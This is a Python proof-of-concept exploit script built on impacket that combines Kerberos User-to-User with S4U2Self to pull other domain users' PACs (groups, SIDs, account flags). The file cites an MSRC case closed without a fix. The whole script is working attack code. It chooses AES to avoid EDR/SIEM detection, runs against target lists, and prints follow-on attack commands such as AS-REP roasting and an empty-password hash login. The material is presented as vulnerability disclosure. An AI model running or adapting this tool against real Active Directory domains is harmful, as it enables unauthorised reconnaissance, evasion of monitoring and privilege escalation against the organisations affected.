#!/usr/bin/env python3
"""
U2U + PA-FOR-USER S4U2Self PAC Extraction PoC

Any authenticated domain user can retrieve any other user's full PAC by
combining User-to-User (U2U) with PA-FOR-USER (S4U2Self).  No SPN, no
GenericWrite, no delegation rights, no machine account required.

Kerberos port 88 only — no LDAP, no SAMR.

MSRC Case 147355 — Closed as "does not meet servicing criteria"

Usage:
    python3 u2u_pac_steal.py DOMAIN/user:pass -t Administrator -dc-ip 10.0.0.1
    python3 u2u_pac_steal.py DOMAIN/user:pass -t users.txt -dc-ip 10.0.0.1
    python3 u2u_pac_steal.py DOMAIN/user:pass -t Administrator,krbtgt,svc_sql -dc-ip 10.0.0.1
"""

import argparse
import datetime
import json
import logging
import os
import random
import struct
import sys
from binascii import hexlify, unhexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.krb5 import constants, pac
from impacket.krb5.asn1 import (
    AD_IF_RELEVANT,
    AP_REQ,
    AS_REP,
    TGS_REQ,
    TGS_REP,
    Authenticator,
    EncTicketPart,
    EncTGSRepPart,
    PA_FOR_USER_ENC,
    Ticket as TicketAsn1,
    seq_set,
    seq_set_iter,
)
from impacket.krb5.asn1 import ETYPE_INFO2, METHOD_DATA
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, Enctype, string_to_key
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive, KerberosError
from impacket.krb5.pac import (
    PACTYPE,
    PAC_INFO_BUFFER,
    KERB_VALIDATION_INFO,
    PAC_CLIENT_INFO,
    PAC_SIGNATURE_DATA,
    PAC_DELEGATION_INFO,
    S4U_DELEGATION_INFO,
    UPN_DNS_INFO,
    TypeSerialization1,
)
from impacket.krb5.types import Principal, KerberosTime, Ticket


BANNER = """
\033[91m╔═══════════════════════════════════════════════════════════════╗
║\033[0m          U2U + S4U2Self PAC Extraction PoC                   \033[91m║
║\033[0m                                                               \033[91m║
║\033[0m  Any domain user → any other user's real PAC                  \033[91m║
║\033[0m  No SPN | No delegation | No machine account                  \033[91m║
║\033[0m                                                               \033[91m║
║\033[0m  MSRC Case 147355 — "Does not meet servicing criteria"        \033[91m║
╚═══════════════════════════════════════════════════════════════╝\033[0m
"""

WELL_KNOWN_RIDS = {
    500: "Administrator", 501: "Guest", 502: "krbtgt",
    512: "Domain Admins", 513: "Domain Users", 514: "Domain Guests",
    515: "Domain Computers", 516: "Domain Controllers",
    517: "Cert Publishers", 518: "Schema Admins", 519: "Enterprise Admins",
    520: "Group Policy Creator Owners",
    525: "Protected Users",
    526: "Key Admins", 527: "Enterprise Key Admins",
    544: "Administrators (Builtin)", 548: "Account Operators",
    549: "Server Operators", 551: "Backup Operators",
    553: "RAS and IAS Servers",
    572: "Denied RODC Password Replication Group",
    574: "Certificate Service DCOM Access",
}

HIGH_PRIV_RIDS = {512, 518, 519, 544, 548, 549, 551}

WELL_KNOWN_SIDS = {
    "S-1-5-18": "LOCAL_SYSTEM",
    "S-1-5-19": "LOCAL_SERVICE",
    "S-1-5-20": "NETWORK_SERVICE",
    "S-1-18-1": "Authentication Authority Asserted Identity",
    "S-1-18-2": "Service Asserted Identity",
}

# PAC UserAccountControl uses SAMR flags (MS-SAMR 2.2.1.12), NOT the LDAP
# ADS_UF_* flags. The bit positions are completely different.
UAC_FLAGS = {
    0x00000001: "ACCOUNTDISABLE",
    0x00000002: "HOMEDIR_REQUIRED",
    0x00000004: "PASSWD_NOTREQD",
    0x00000008: "TEMP_DUPLICATE_ACCOUNT",
    0x00000010: "NORMAL_ACCOUNT",
    0x00000020: "INTERDOMAIN_TRUST_ACCOUNT",
    0x00000040: "WORKSTATION_TRUST_ACCOUNT",
    0x00000080: "SERVER_TRUST_ACCOUNT",
    0x00000200: "DONT_EXPIRE_PASSWORD",
    0x00000400: "LOCKOUT",
    0x00001000: "SMARTCARD_REQUIRED",
    0x00002000: "TRUSTED_FOR_DELEGATION",
    0x00004000: "NOT_DELEGATED",
    0x00008000: "USE_DES_KEY_ONLY",
    0x00010000: "DONT_REQ_PREAUTH",
    0x00020000: "PASSWORD_EXPIRED",
    0x00040000: "TRUSTED_TO_AUTH_FOR_DELEGATION",
    0x00080000: "NO_AUTH_DATA_REQUIRED",
    0x00100000: "PARTIAL_SECRETS_ACCOUNT",
}

SAMR_UF_ACCOUNTDISABLE              = 0x00000001
SAMR_UF_PASSWD_NOTREQD              = 0x00000004
SAMR_UF_NORMAL_ACCOUNT              = 0x00000010
SAMR_UF_DONT_EXPIRE_PASSWORD        = 0x00000200
SAMR_UF_LOCKOUT                     = 0x00000400
SAMR_UF_SMARTCARD_REQUIRED          = 0x00001000
SAMR_UF_TRUSTED_FOR_DELEGATION      = 0x00002000
SAMR_UF_NOT_DELEGATED               = 0x00004000
SAMR_UF_USE_DES_KEY_ONLY            = 0x00008000
SAMR_UF_DONT_REQ_PREAUTH            = 0x00010000
SAMR_UF_PASSWORD_EXPIRED            = 0x00020000
SAMR_UF_TRUSTED_TO_AUTH_FOR_DELEG   = 0x00040000

# ─────────────────────────────────────────────────────────────
#  Core: U2U + PA-FOR-USER TGS-REQ builder
# ─────────────────────────────────────────────────────────────

class U2UEngine:
    def __init__(self, username, password, domain,
                 lmhash='', nthash='', aesKey='', dc_ip=None):
        self.username = username
        self.password = password
        self.domain = domain.upper()
        self.lmhash = lmhash
        self.nthash = nthash
        self.aesKey = aesKey
        self.dc_ip = dc_ip
        self.tgt = None
        self.cipher = None
        self.sessionKey = None
        self.decoded_tgt = None
        self.ticket = None

    def get_tgt(self):
        principal = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        lm = unhexlify(self.lmhash) if self.lmhash else b''
        nt = unhexlify(self.nthash) if self.nthash else b''

        password = self.password
        aesKey = self.aesKey

        # If we have a plaintext password and no AES key or hash, do a two-stage
        # AS-REQ: first negotiate the etype salt, then derive AES256 from it.
        # This avoids RC4 which is a red flag on modern EDR/SIEM.
        if password and not aesKey and not nt:
            try:
                aesKey = self._derive_aes_key(principal, password)
                if aesKey:
                    password = ''
            except Exception:
                pass

        tgt, cipher, _, sessionKey = getKerberosTGT(
            principal, password, self.domain, lm, nt, aesKey, self.dc_ip,
        )
        self.tgt = tgt
        self.cipher = cipher
        self.sessionKey = sessionKey
        self.decoded_tgt = decoder.decode(tgt, asn1Spec=AS_REP())[0]
        self.ticket = Ticket()
        self.ticket.from_asn1(self.decoded_tgt['ticket'])

    def _derive_aes_key(self, principal, password):
        """Stage 1: send unauthenticated AS-REQ to get etype salt from KDC,
        then derive AES256 key. Returns hex key string or None."""
        AES256 = constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
        AES128 = constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value
        try:
            getKerberosTGT(principal, '', self.domain, b'', b'', '', self.dc_ip,
                           requestPAC=True, kerberoast_no_preauth=True)
            return None
        except KerberosError as e:
            code = e.getErrorCode()
            if code not in (constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value,
                            constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value):
                return None
            salts = self._parse_etype_salts(e)
            for etype in (AES256, AES128):
                salt = salts.get(etype)
                if salt:
                    key = string_to_key(etype, password.encode(), salt.encode())
                    return key.contents.hex()
        return None

    @staticmethod
    def _parse_etype_salts(err):
        salts = {}
        try:
            edata = err.packet['e-data']
        except Exception:
            return salts
        raw = bytes(edata.asOctets()) if hasattr(edata, 'asOctets') else bytes(edata)
        try:
            methods = decoder.decode(raw, asn1Spec=METHOD_DATA())[0]
        except Exception:
            return salts
        for method in methods:
            ptype = method['padata-type']
            if ptype == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
                try:
                    entries = decoder.decode(bytes(method['padata-value']), asn1Spec=ETYPE_INFO2())[0]
                except Exception:
                    continue
                for entry in entries:
                    sf = entry['salt']
                    if sf is not None and sf.hasValue():
                        salts[int(entry['etype'])] = sf.prettyPrint()
        return salts

    def extract_pac_raw(self, target_user):
        """Send U2U+PA-FOR-USER TGS-REQ, return (tgs_rep, decrypted_ticket_bytes)."""
        ap_req = AP_REQ()
        ap_req['pvno'] = 5
        ap_req['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap_req['ap-options'] = constants.encodeFlags([])
        seq_set(ap_req, 'ticket', self.ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(self.decoded_tgt['crealm'])
        client_name = Principal()
        client_name.from_asn1(self.decoded_tgt, 'crealm', 'cname')
        seq_set(authenticator, 'cname', client_name.components_to_asn1)
        now = datetime.datetime.now(datetime.timezone.utc)
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)
        encoded_auth = encoder.encode(authenticator)
        encrypted_auth = self.cipher.encrypt(self.sessionKey, 7, encoded_auth, None)
        ap_req['authenticator'] = noValue
        ap_req['authenticator']['etype'] = self.cipher.enctype
        ap_req['authenticator']['cipher'] = encrypted_auth

        tgs_req = TGS_REQ()
        tgs_req['pvno'] = 5
        tgs_req['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgs_req['padata'] = noValue
        tgs_req['padata'][0] = noValue
        tgs_req['padata'][0]['padata-type'] = int(
            constants.PreAuthenticationDataTypes.PA_TGS_REQ.value
        )
        tgs_req['padata'][0]['padata-value'] = encoder.encode(ap_req)

        target_principal = Principal(
            target_user, type=constants.PrincipalNameType.NT_PRINCIPAL.value
        )
        s4u_bytes = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
        s4u_bytes += (
            target_user.encode('utf-8')
            + self.domain.encode('utf-8')
            + b'Kerberos'
        )
        checksum = _HMACMD5.checksum(self.sessionKey, 17, s4u_bytes)

        pa_for_user = PA_FOR_USER_ENC()
        seq_set(pa_for_user, 'userName', target_principal.components_to_asn1)
        pa_for_user['userRealm'] = self.domain
        pa_for_user['cksum'] = noValue
        pa_for_user['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        pa_for_user['cksum']['checksum'] = checksum
        pa_for_user['auth-package'] = 'Kerberos'

        tgs_req['padata'][1] = noValue
        tgs_req['padata'][1]['padata-type'] = int(
            constants.PreAuthenticationDataTypes.PA_FOR_USER.value
        )
        tgs_req['padata'][1]['padata-value'] = encoder.encode(pa_for_user)

        req_body = seq_set(tgs_req, 'req-body')
        opts = [
            constants.KDCOptions.forwardable.value,
            constants.KDCOptions.renewable.value,
            constants.KDCOptions.canonicalize.value,
            constants.KDCOptions.renewable_ok.value,
            constants.KDCOptions.enc_tkt_in_skey.value,
        ]
        req_body['kdc-options'] = constants.encodeFlags(opts)
        server_name = Principal(
            self.username, type=constants.PrincipalNameType.NT_UNKNOWN.value
        )
        seq_set(req_body, 'sname', server_name.components_to_asn1)
        req_body['realm'] = str(self.decoded_tgt['crealm'])
        tomorrow = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        req_body['till'] = KerberosTime.to_asn1(tomorrow)
        req_body['nonce'] = random.getrandbits(31)
        seq_set_iter(req_body, 'etype', (
            int(self.cipher.enctype),
            int(constants.EncryptionTypes.rc4_hmac.value),
        ))
        my_ticket = self.ticket.to_asn1(TicketAsn1())
        seq_set_iter(req_body, 'additional-tickets', (my_ticket,))

        response = sendReceive(encoder.encode(tgs_req), self.domain, self.dc_ip)
        tgs_rep = decoder.decode(response, asn1Spec=TGS_REP())[0]

        cipher_text = tgs_rep['ticket']['enc-part']['cipher']
        etype = int(tgs_rep['ticket']['enc-part']['etype'])
        ticket_cipher = _enctype_table[etype]

        try:
            plain_text = ticket_cipher.decrypt(self.sessionKey, 2, cipher_text)
        except Exception:
            if self.nthash:
                key = Key(ticket_cipher.enctype, unhexlify(self.nthash))
            elif ticket_cipher.enctype == Enctype.RC4:
                key = ticket_cipher.string_to_key(self.password, '', None)
            else:
                key = ticket_cipher.string_to_key(
                    self.password, self.domain + self.username, None
                )
            plain_text = ticket_cipher.decrypt(key, 2, cipher_text)

        return tgs_rep, plain_text


# ─────────────────────────────────────────────────────────────
#  PAC parsing helpers
# ─────────────────────────────────────────────────────────────

def decode_uac_flags(uac):
    flags = []
    for bit, name in sorted(UAC_FLAGS.items()):
        if uac & bit:
            flags.append(name)
    return flags


def parse_pac_logon_info(pac_data, info_buffer):
    buf_data = pac_data[info_buffer['Offset']:][:info_buffer['cbBufferSize']]
    type1 = TypeSerialization1(buf_data)
    newdata = buf_data[len(type1) + 4:]
    kerbdata = KERB_VALIDATION_INFO()
    kerbdata.fromString(newdata)
    kerbdata.fromStringReferents(newdata[len(kerbdata.getData()):])

    groups = []
    for i in range(kerbdata['GroupCount']):
        rid = kerbdata['GroupIds'][i]['RelativeId']
        attrs = kerbdata['GroupIds'][i]['Attributes']
        groups.append({'rid': rid, 'attrs': attrs})

    extra_sids = []
    for i in range(kerbdata['SidCount']):
        sid = kerbdata['ExtraSids'][i]['Sid'].formatCanonical()
        attrs = kerbdata['ExtraSids'][i]['Attributes']
        extra_sids.append({'sid': sid, 'attrs': attrs})

    domain_sid = kerbdata['LogonDomainId'].formatCanonical()
    uac = kerbdata['UserAccountControl']

    return {
        'effective_name': str(kerbdata['EffectiveName']),
        'full_name': str(kerbdata['FullName']),
        'rid': kerbdata['UserId'],
        'primary_group': kerbdata['PrimaryGroupId'],
        'domain_sid': domain_sid,
        'sid': '%s-%d' % (domain_sid, kerbdata['UserId']),
        'logon_count': kerbdata['LogonCount'],
        'bad_password_count': kerbdata['BadPasswordCount'],
        'user_flags': kerbdata['UserFlags'],
        'uac': uac,
        'uac_flags': decode_uac_flags(uac),
        'groups': groups,
        'group_rids': [g['rid'] for g in groups],
        'group_names': [WELL_KNOWN_RIDS.get(g['rid'], str(g['rid'])) for g in groups],
        'extra_sids': extra_sids,
        'logon_domain_name': str(kerbdata['LogonDomainName']),
    }


def parse_full_pac(pac_data):
    pac_type = PACTYPE(pac_data)
    result = {
        'buffer_count': pac_type['cBuffers'],
        'logon_info': None,
        'client_name': None,
        'has_delegation_info': False,
        'buffers': [],
    }

    buff = pac_type['Buffers']
    for buf_idx in range(pac_type['cBuffers']):
        info_buffer = PAC_INFO_BUFFER(buff)
        buf_type = info_buffer['ulType']
        buf_data = pac_data[info_buffer['Offset']:][:info_buffer['cbBufferSize']]

        entry = {'index': buf_idx, 'type': buf_type, 'size': info_buffer['cbBufferSize']}

        if buf_type == pac.PAC_LOGON_INFO:
            entry['name'] = 'LOGON_INFO'
            result['logon_info'] = parse_pac_logon_info(pac_data, info_buffer)
        elif buf_type == pac.PAC_CLIENT_INFO_TYPE:
            entry['name'] = 'CLIENT_INFO'
            ci = PAC_CLIENT_INFO(buf_data)
            name_len = ci['NameLength']
            name_raw = buf_data[10:10 + name_len]
            try:
                result['client_name'] = name_raw.decode('utf-16-le')
            except Exception:
                result['client_name'] = hexlify(name_raw).decode()
        elif buf_type == pac.PAC_SERVER_CHECKSUM:
            entry['name'] = 'SERVER_CHECKSUM'
            sig = PAC_SIGNATURE_DATA(buf_data)
            entry['signature_type'] = sig['SignatureType']
        elif buf_type == pac.PAC_PRIVSVR_CHECKSUM:
            entry['name'] = 'KDC_CHECKSUM'
            sig = PAC_SIGNATURE_DATA(buf_data)
            entry['signature_type'] = sig['SignatureType']
        elif buf_type == pac.PAC_DELEGATION_INFO:
            entry['name'] = 'DELEGATION_INFO'
            result['has_delegation_info'] = True
        elif buf_type == pac.PAC_UPN_DNS_INFO:
            entry['name'] = 'UPN_DNS_INFO'
            try:
                upn = UPN_DNS_INFO(buf_data)
                upn_len = upn['UpnLength']
                upn_off = upn['UpnOffset']
                dns_len = upn['DnsDomainNameLength']
                dns_off = upn['DnsDomainNameOffset']
                entry['upn'] = buf_data[upn_off:upn_off + upn_len].decode('utf-16-le')
                entry['dns_domain'] = buf_data[dns_off:dns_off + dns_len].decode('utf-16-le')
            except Exception:
                pass
        elif buf_type == pac.PAC_ATTRIBUTES_INFO:
            entry['name'] = 'ATTRIBUTES_INFO'
        elif buf_type == pac.PAC_REQUESTOR_INFO:
            entry['name'] = 'PAC_REQUESTOR'
        else:
            entry['name'] = 'UNKNOWN_0x%x' % buf_type

        result['buffers'].append(entry)
        buff = buff[len(info_buffer):]

    return result


def get_ticket_flags(tgs_rep, session_key):
    rep_cipher = _enctype_table[int(tgs_rep['enc-part']['etype'])]
    rep_plain = rep_cipher.decrypt(session_key, 8, tgs_rep['enc-part']['cipher'])
    enc_rep = decoder.decode(rep_plain, asn1Spec=EncTGSRepPart())[0]
    flags_int = int(enc_rep['flags'])
    flag_names = []
    for name in ['forwardable', 'forwarded', 'proxiable', 'proxy',
                 'renewable', 'pre_authent', 'enc_pa_rep']:
        if hasattr(constants.TicketFlags, name):
            bit = constants.TicketFlags[name].value
            if flags_int & (1 << (31 - bit)):
                flag_names.append(name)
    return flag_names


# ─────────────────────────────────────────────────────────────
#  Attack path analysis
# ─────────────────────────────────────────────────────────────

def analyze_attack_paths(info, target_user, domain, dc_ip, requesting_user='', requesting_pass=''):
    paths = []
    uac = info['uac']
    rids = set(info['group_rids'])

    cred_str = '%s/%s' % (domain, requesting_user)
    if requesting_pass:
        cred_str += ':%s' % requesting_pass

    if uac & SAMR_UF_DONT_REQ_PREAUTH:
        paths.append({
            'id': 'ASREP_ROAST',
            'title': 'AS-REP Roastable (DONT_REQUIRE_PREAUTH)',
            'detail': (
                'Kerberos pre-authentication is disabled. '
                'Request an AS-REP and crack offline to recover the plaintext password.'
            ),
            'command': "impacket-GetNPUsers '%s/%s' -dc-ip %s -no-pass -format hashcat" % (
                domain, target_user, dc_ip or '<DC_IP>'
            ),
        })

    if 525 in rids:
        paths.append({
            'id': 'PROTECTED_USERS_BYPASS',
            'title': 'Protected Users Bypass Confirmed',
            'detail': (
                'Member of Protected Users (RID 525), which should restrict delegation '
                'and impersonation. Despite this, the KDC returned their full PAC via '
                'U2U + PA-FOR-USER — the protection is bypassed.'
            ),
            'command': None,
        })

    if uac & SAMR_UF_TRUSTED_FOR_DELEGATION:
        paths.append({
            'id': 'UNCONSTRAINED_DELEG',
            'title': 'Unconstrained Delegation',
            'detail': (
                'Trusted for unconstrained delegation. If compromised, an attacker can '
                'harvest TGTs from any user who authenticates to services running as '
                'this account. Combine with printer bug or PetitPotam.'
            ),
            'command': None,
        })

    if uac & SAMR_UF_TRUSTED_TO_AUTH_FOR_DELEG:
        paths.append({
            'id': 'CONSTRAINED_DELEG_T2A4D',
            'title': 'Constrained Delegation w/ Protocol Transition (T2A4D)',
            'detail': (
                'Can impersonate any user to its allowed delegation targets using '
                'S4U2Self + S4U2Proxy, even without the target user authenticating.'
            ),
            'command': None,
        })

    if uac & SAMR_UF_PASSWD_NOTREQD:
        paths.append({
            'id': 'PASSWD_NOTREQD',
            'title': 'Password Not Required',
            'detail': 'This account can have an empty password.',
            'command': "impacket-getTGT '%s/%s' -dc-ip %s -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0'" % (
                domain, target_user, dc_ip or '<DC_IP>'
            ),
        })

    if uac & SAMR_UF_USE_DES_KEY_ONLY:
        paths.append({
            'id': 'DES_ONLY',
            'title': 'DES-Only Encryption',
            'detail': 'Only DES keys are used. DES is trivially breakable.',
            'command': None,
        })

    if (uac & SAMR_UF_ACCOUNTDISABLE) and (rids & HIGH_PRIV_RIDS):
        high_names = [WELL_KNOWN_RIDS.get(r, str(r)) for r in rids & HIGH_PRIV_RIDS]
        paths.append({
            'id': 'DISABLED_HIGH_PRIV',
            'title': 'Disabled Account in Privileged Group',
            'detail': (
                'Account is disabled but retains membership in: %s. '
                'If re-enabled it becomes an instant escalation path.' % ', '.join(high_names)
            ),
            'command': None,
        })

    if info['extra_sids']:
        domain_extra = [
            s for s in info['extra_sids']
            if s['sid'].startswith('S-1-5-21-')
            and not s['sid'].startswith(info['domain_sid'])
        ]
        if domain_extra:
            sids = ', '.join(s['sid'] for s in domain_extra)
            paths.append({
                'id': 'SID_HISTORY_CROSS_DOMAIN',
                'title': 'Cross-Domain SID in SID History',
                'detail': (
                    'Extra SIDs from a different domain detected: %s. '
                    'May indicate SID History injection or trust-based privilege escalation.' % sids
                ),
                'command': None,
            })

    return paths


# ─────────────────────────────────────────────────────────────
#  Print one user's full PAC
# ─────────────────────────────────────────────────────────────

def print_pac(target, engine, tgs_rep, plain_text):
    ticket_flags = get_ticket_flags(tgs_rep, engine.sessionKey)

    enc_ticket = decoder.decode(plain_text, asn1Spec=EncTicketPart())[0]
    if not enc_ticket['authorization-data']:
        print("  [-] %s: no authorization-data in ticket" % target)
        return None

    ad = decoder.decode(
        enc_ticket['authorization-data'][0]['ad-data'],
        asn1Spec=AD_IF_RELEVANT()
    )[0]
    pac_data = ad[0]['ad-data'].asOctets()
    pac_result = parse_full_pac(pac_data)
    info = pac_result['logon_info']

    if not info:
        print("  [-] %s: no LOGON_INFO in PAC" % target)
        return None

    rids = set(info['group_rids'])
    is_protected = 525 in rids

    # ── Header ──
    print("\033[91m" + "=" * 65 + "\033[0m")
    prot_str = "  \033[93m[PROTECTED USER]\033[0m" if is_protected else ""
    print("  \033[1m%s\033[0m%s" % (target, prot_str))
    print("\033[91m" + "=" * 65 + "\033[0m")
    print()

    # Identity
    print("  \033[1m[IDENTITY]\033[0m")
    print("    EffectiveName:       %s" % info['effective_name'])
    if info['full_name']:
        print("    FullName:            %s" % info['full_name'])
    print("    SID:                 %s" % info['sid'])
    print("    RID:                 %d" % info['rid'])
    print("    PrimaryGroupId:      %d (%s)" % (
        info['primary_group'],
        WELL_KNOWN_RIDS.get(info['primary_group'], '?')
    ))
    if info.get('logon_domain_name'):
        print("    LogonDomainName:     %s" % info['logon_domain_name'])
    print("    LogonCount:          %d" % info['logon_count'])
    print("    BadPasswordCount:    %d" % info['bad_password_count'])
    print("    Protected User:      %s" % ("\033[93mYES\033[0m" if is_protected else "NO"))
    print()

    # UAC
    print("  \033[1m[USER ACCOUNT CONTROL]\033[0m  0x%x" % info['uac'])
    for flag in info['uac_flags']:
        color = '\033[93m' if flag in (
            'DONT_REQ_PREAUTH', 'TRUSTED_FOR_DELEGATION',
            'TRUSTED_TO_AUTH_FOR_DELEGATION', 'PASSWD_NOTREQD',
            'ACCOUNTDISABLE', 'LOCKOUT', 'USE_DES_KEY_ONLY',
            'PASSWORD_EXPIRED', 'SMARTCARD_REQUIRED',
        ) else ''
        reset = '\033[0m' if color else ''
        print("    %s• %s%s" % (color, flag, reset))
    print()

    # Groups
    print("  \033[1m[GROUP MEMBERSHIPS]\033[0m  (%d groups)" % len(info['groups']))
    for g in info['groups']:
        rid = g['rid']
        name = WELL_KNOWN_RIDS.get(rid, '')
        marker = ''
        if rid == 525:
            marker = ' \033[93m← PROTECTED USERS\033[0m'
        if name:
            print("    RID %-6d  %s%s" % (rid, name, marker))
        else:
            print("    RID %-6d%s" % (rid, marker))
    print()

    # Extra SIDs
    if info['extra_sids']:
        print("  \033[1m[EXTRA SIDS]\033[0m  (%d)" % len(info['extra_sids']))
        for s in info['extra_sids']:
            sid = s['sid']
            known = WELL_KNOWN_SIDS.get(sid, '')
            foreign = ''
            if sid.startswith('S-1-5-21-') and not sid.startswith(info['domain_sid']):
                foreign = ' \033[91m← FOREIGN DOMAIN\033[0m'
            if known:
                print("    %s  (%s)%s" % (sid, known, foreign))
            else:
                print("    %s%s" % (sid, foreign))
        print()

    # Ticket flags
    if ticket_flags:
        print("  \033[1m[TICKET FLAGS]\033[0m  %s" % ', '.join(ticket_flags))
        if 'forwardable' in ticket_flags:
            print("    \033[93m[!] FORWARDABLE — delegation-capable ticket\033[0m")
        print()

    # PAC Buffers
    print("  \033[1m[PAC BUFFERS]\033[0m  (%d total)" % pac_result['buffer_count'])
    for b in pac_result['buffers']:
        extra = ''
        if b['name'] == 'DELEGATION_INFO' and is_protected:
            extra = ' \033[93m← present despite Protected Users membership\033[0m'
        elif b['name'] == 'UPN_DNS_INFO' and b.get('upn'):
            extra = '  UPN: %s  DNS: %s' % (b.get('upn', ''), b.get('dns_domain', ''))
        print("    [%d] %-20s  %d bytes%s" % (b['index'], b['name'], b['size'], extra))
    print()

    # Attack paths
    paths = analyze_attack_paths(
        info, target, engine.domain, engine.dc_ip,
        requesting_user=engine.username, requesting_pass=engine.password,
    )

    if paths:
        print("  \033[1m[ATTACK PATHS]\033[0m")
        for p in paths:
            print("    \033[93m•\033[0m %s" % p['title'])
            print("      %s" % p['detail'])
            if p.get('command'):
                print("      \033[90m$ %s\033[0m" % p['command'])
            print()

    return {
        'target': target,
        'info': info,
        'pac': pac_result,
        'paths': paths,
        'flags': ticket_flags,
    }


# ─────────────────────────────────────────────────────────────
#  Resolve targets from -t value
# ─────────────────────────────────────────────────────────────

def resolve_targets(value):
    if value == '-':
        return [l.strip() for l in sys.stdin if l.strip()]
    if os.path.isfile(value):
        with open(value) as f:
            return [l.strip() for l in f if l.strip() and not l.startswith('#')]
    return [t.strip() for t in value.split(',') if t.strip()]


# ─────────────────────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────────────────────

def parse_credentials(cred_string):
    domain = ''
    if '/' in cred_string:
        domain, rest = cred_string.split('/', 1)
    else:
        rest = cred_string
    if ':' in rest:
        username, password = rest.split(':', 1)
    else:
        username, password = rest, ''
    return domain, username, password


def main():
    parser = argparse.ArgumentParser(
        description="U2U + S4U2Self PAC Extraction — Kerberos port 88 only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s DOMAIN/user:pass -t Administrator -dc-ip 10.0.0.1
  %(prog)s DOMAIN/user:pass -t Administrator,krbtgt,svc_sql -dc-ip 10.0.0.1
  %(prog)s DOMAIN/user:pass -t users.txt -dc-ip 10.0.0.1
  %(prog)s DOMAIN/user:pass -t users.txt -dc-ip 10.0.0.1 -json

MSRC Case 147355 — Closed, "does not meet servicing criteria"
        """
    )

    parser.add_argument('credentials', help='domain/username[:password]')
    parser.add_argument('-t', required=True,
                        help='Target user(s): username, comma-separated list, or file path')
    parser.add_argument('-hashes', default=None, help='LMHASH:NTHASH')
    parser.add_argument('-aesKey', default=None, help='AES key (128 or 256 bit)')
    parser.add_argument('-dc-ip', default=None, help='Domain Controller IP')
    parser.add_argument('-json', action='store_true', help='JSON output')
    parser.add_argument('-debug', action='store_true', help='Debug output')

    args = parser.parse_args()

    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password = parse_credentials(args.credentials)
    if not domain:
        print("[-] Domain required (DOMAIN/username[:password])")
        sys.exit(1)

    lmhash = nthash = ''
    if args.hashes:
        lmhash, nthash = args.hashes.split(':')

    aesKey = args.aesKey or ''

    if not password and not nthash and not aesKey:
        from getpass import getpass
        password = getpass("Password: ")

    targets = resolve_targets(args.t)
    if not targets:
        print("[-] No targets resolved from: %s" % args.t)
        sys.exit(1)

    engine = U2UEngine(
        username=username, password=password, domain=domain,
        lmhash=lmhash, nthash=nthash, aesKey=aesKey, dc_ip=getattr(args, 'dc_ip'),
    )

    print(BANNER)
    print("[*] Requesting TGT for %s@%s" % (engine.username, engine.domain))
    engine.get_tgt()
    print("[+] TGT obtained (etype %d)" % engine.cipher.enctype)
    print("[*] Targets: %d" % len(targets))
    print()

    results = []
    errors = []

    for target in targets:
        try:
            tgs_rep, plain_text = engine.extract_pac_raw(target)
            result = print_pac(target, engine, tgs_rep, plain_text)
            if result:
                results.append(result)
        except Exception as e:
            errors.append((target, str(e)))
            print("  [-] %-22s  error: %s" % (target, str(e)))
            print()

    # Footer
    print("\033[91m" + "=" * 65 + "\033[0m")
    print("  PACs retrieved: %d/%d via Kerberos port 88 only" % (len(results), len(targets)))
    if errors:
        print("  Errors: %d" % len(errors))
    print("  Requesting user: %s@%s (no SPN, no delegation, no machine account)" % (
        engine.username, engine.domain
    ))
    print("\033[91m" + "=" * 65 + "\033[0m")

    if args.json:
        json_out = []
        for r in results:
            entry = dict(r['info'])
            entry['attack_paths'] = [
                {'id': p['id'], 'title': p['title']}
                for p in r['paths']
            ]
            entry['ticket_flags'] = r['flags']
            entry['protected_user'] = 525 in r['info']['group_rids']
            json_out.append(entry)
        print()
        print(json.dumps(json_out, indent=2))


if __name__ == '__main__':
    main()
